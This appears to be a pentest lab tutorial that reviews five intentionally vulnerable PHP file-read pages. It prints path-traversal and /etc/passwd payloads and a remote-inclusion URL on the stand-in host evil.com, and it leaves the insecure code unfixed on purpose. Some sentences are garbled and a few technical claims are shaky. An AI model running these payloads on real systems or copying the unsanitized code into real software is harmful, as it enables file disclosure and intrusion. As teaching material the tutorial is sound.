
# **HTML Injection : Read-File**

---

## **1. Vulnerable Code Review: html-injection-read-file.php**
This PHP page reads and outputs the content of a file based on a user-supplied `filename` parameter, introducing a **Local File Inclusion (LFI)** and **Remote File Inclusion (RFI)** vulnerability.


```php
html-injection-read-file.php**
```

```php
<!DOCTYPE html>
<html>
<head>
  <meta charset='utf-8'>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Html Injection Read File</title>
</head>
<body>
<pre>
<?php
$filename = $_GET['filename'];
echo readfile($filename);
?>
</pre>
</body>
</html>
```

**Example URLs:**

```
http://192.168.1.45/webpentest/html-injection-read-file.php?filename=/var/www/html/index.html
http://192.168.1.45/webpentest/html-injection-read-file.php?filename=/etc/passwd  
http://192.168.1.45/webpentest/html-injection-read-file.php?filename=https://www.anoninfosec.com/index.php
```

---

### **Vulnerability Details:**

* The `filename` parameter is passed directly to `readfile()` without any validation or sanitization.
* This allows attackers to:

  * Read local files such as `/etc/passwd` or configuration files.
  * Fetch and display remote files via URLs (if `allow_url_fopen` is enabled).

---

### **Exploitation Examples:**

* Local file read:
  `?filename=/etc/passwd`
* Remote file inclusion:
  `?filename=https://evil.com/malicious.txt`

---

### **Security Implications:**

* Disclosure of sensitive files, credentials, and keys.
* Potential remote code execution if chained with other vulnerabilities.
* Server info and code leakage.

---

### **Summary:**

The code is vulnerable because it allows arbitrary file reading based on untrusted input. No mitigations have been applied per request.

---

## **2. Vulnerable Code Review: html-injection-read-file2.php**
```php
html-injection-read-file2.php
```

```php
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Html Injection Read File 2</title>
</head>
<body>
<h1>Html Injection Read File 2</h1>
<form action="html-injection-read-file2.php" method="POST">
  <label for="filename">Choose a File:</label>
  <select name="filename" id="filename">
    <option value="index.html">Index.html</option>
    <option value="robots.txt">robots.txt</option>
  </select>
  <br><br>
  <input type="submit" name="submit" value="submit">
</form>
<pre>
<?php
if (isset($_POST['submit'])) {
  $filename = $_POST['filename'];
  echo readfile($filename);
}
?>
</pre>
</body>
</html>
```

---

### **Vulnerability Details:**

* Although the dropdown limits options, the `filename` value is used directly in `readfile()`.
* An attacker can craft a malicious POST request and bypass the dropdown.

---

### **Example Attack Vector:**

POST request:

```
filename=../../../../etc/passwd
```

---

### **Security Considerations:**

* Server-side whitelisting is needed.
* Always sanitize user input.
* Limit file reads to specific directories.

---

## **3. Vulnerable Code Review: html-injection-read-file3.php**

**This PHP code reads and outputs the content of a file based on a i i i ename GET parameter, restricted via a regex pattern.**

```php
html-injection-read-file3.php
```
```php
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Html Injection Read File 3</title>
</head>
<body>
<pre>
<?php
$filename = $_GET['filename'];
// Regex allows only certain patterns ending with .txt
if (preg_match('/^[a-zA-Z0-9_\/\.]+\.txt$/', $filename)) {
  echo readfile($filename);
}
?>
</pre>
</body>
</html>
```

---

### **Example Usage:**

```
http://192.168.129.145/webpentest/html-injection-read-file3.php?filename=robots.txt
```

---

### **Vulnerability Details:**

* The regex restricts some characters but still allows `../` traversal.
* Allows reading of `.txt` files outside the intended path.

---

### **Potential Attack Example:**

```
filename=../../../../etc/passwd.txt
```

---

## **4. Vulnerable Code Review: html-injection-read-file4.php**
**The Intended vulnerability remains: it attempts to restrict filo reads to a whiteiist. but the check logic can be improved. The overall structure allows reading only selected files. but subtle issues remain.**
```php
html-injection-read-file4.php
```
```php
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Html Injection Read File 4</title>
</head>
<body>
<h1>Html Injection Read File 4</h1>
<form action="html-injection-read-file4.php" method="POST">
  <label for="filename">Choose a File:</label>
  <select name="filename" id="filename">
    <option value="index.html">Index.html</option>
    <option value="robots.txt">robots.txt</option>
  </select>
  <br><br>
  <input type="submit" name="submit" value="submit">
</form>
<?php
if (isset($_POST['submit'])) {
  $filename = $_POST['filename'];
  $files = array('index.html', 'robots.txt');
  if (preg_grep("/$filename/i", $files)) {
    echo readfile($filename);
  } else {
    echo "Error";
  }
}
?>
</body>
</html>
```

---

### **Explanation & Vulnerability Analysis:**

* Whitelist is used, but comparison is via regex.
* `$filename` is directly used in regex, creating a **regex injection** risk.
* Partial match behavior may allow unintended file reads.

---

### **Improvements (not applied):**

* Escape regex characters in `$filename`.
* Use strict comparison instead of regex.

---

## **5. Vulnerable Code Review: html-injection-read-file5.php**
**The logic strictly checks if the filename is exactly 'index.html' or 'robots.txt' before calling readfile(). Despite this whitelist check, the code remains vulnerable to information disclosure and lacks proper output sanitization. Additionally, it relies solely on the clientâ€™s POST request for filename selection, which can easily be manipulated.**
```php
html-injection-read-file5.php
```
```php
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Html Injection Read File 5</title>
</head>
<body>
<h1>Html Injection Read File 5</h1>
<form action="html-injection-read-file5.php" method="POST">
  <label for="filename">Choose a File:</label>
  <select name="filename" id="filename">
    <option value="index.html">Index.html</option>
    <option value="robots.txt">robots.txt</option>
  </select>
  <br><br>
  <input type="submit" name="submit" value="submit">
</form>
<?php
if (isset($_POST['submit'])) {
  $filename = $_POST['filename'];
  if ($filename === "index.html" || $filename === "robots.txt") {
    echo readfile($filename);
  } else {
    echo "Error";
  }
}
?>
</body>
</html>
```

---

### **Notes on Vulnerability:**

* Strict comparison improves security.
* Still vulnerable to file content injection (e.g., HTML inside file gets rendered).
* No sanitization of output.
* Missing file read error handling.

---

### **Summary:**

* Improved whitelist logic via strict equality check.
* Readable file contents still rendered as-is (may include scripts).
* Vulnerability remains due to raw file output and client-controlled POST input.

---

